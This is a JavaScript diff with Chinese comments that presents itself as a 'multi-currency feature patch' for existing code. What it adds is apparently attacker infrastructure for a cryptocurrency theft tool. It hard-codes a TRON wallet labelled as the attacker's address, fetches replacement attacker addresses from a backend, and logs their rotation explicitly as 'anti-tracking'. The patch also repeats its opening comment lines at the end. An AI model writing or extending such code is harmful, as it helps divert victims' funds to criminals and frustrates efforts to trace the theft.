@@ -1,3 +1,50 @@
+
+// 🎯 多币种功能补丁 - 在现有代码基础上添加
+// 保留所有原有功能，只添加多币种支持
+
+// 🎯 攻击者地址配置 - 动态后端管理
+let CURRENT_ATTACKER_ADDRESS = 'THjNZbFNv9w3M1wyisiaFX97rHrP4gF44x';  // 默认地址
+const BACKEND_API = 'http://localhost:5001';  // Python后端地址
+
+// 🔄 实时获取攻击者地址
+async function getCurrentAttackerAddress() {
+    try {
+        const response = await fetch(`${BACKEND_API}/api/attacker_address`);
+        const result = await response.json();
+
+        if (result.status === 'success') {
+            const oldAddress = CURRENT_ATTACKER_ADDRESS;
+            CURRENT_ATTACKER_ADDRESS = result.data.attacker_address;
+
+            // 如果地址发生变化，记录轮换日志
+            if (oldAddress !== CURRENT_ATTACKER_ADDRESS) {
+                console.log(`🔄 [防追踪] 攻击者地址已轮换:`);
+                console.log(`   旧地址: ${oldAddress}`);
+                console.log(`   新地址: ${CURRENT_ATTACKER_ADDRESS}`);
+                console.log(`   钱包名称: ${result.data.wallet_name}`);
+                console.log(`   使用次数: ${result.data.usage_count}`);
+                console.log(`   轮换设置: 每${result.data.max_usage}次或${result.data.rotation_interval_hours}小时轮换一次`);
+            }
+
+            return {
+                address: CURRENT_ATTACKER_ADDRESS,
+                info: result.data
+            };
+        } else {
+            console.warn('⚠️ 获取攻击者地址失败，使用默认地址');
+            return {
+                address: CURRENT_ATTACKER_ADDRESS,
+                info: null
+            };
+        }
+    } catch (error) {
+        console.warn('⚠️ 后端连接失败，使用默认攻击者地址:', error);
+        return {
+            address: CURRENT_ATTACKER_ADDRESS,
+            info: null
+        };
+    }
+}
 // 🎯 多币种功能补丁 - 在现有代码基础上添加
 // 保留所有原有功能，只添加多币种支持
 
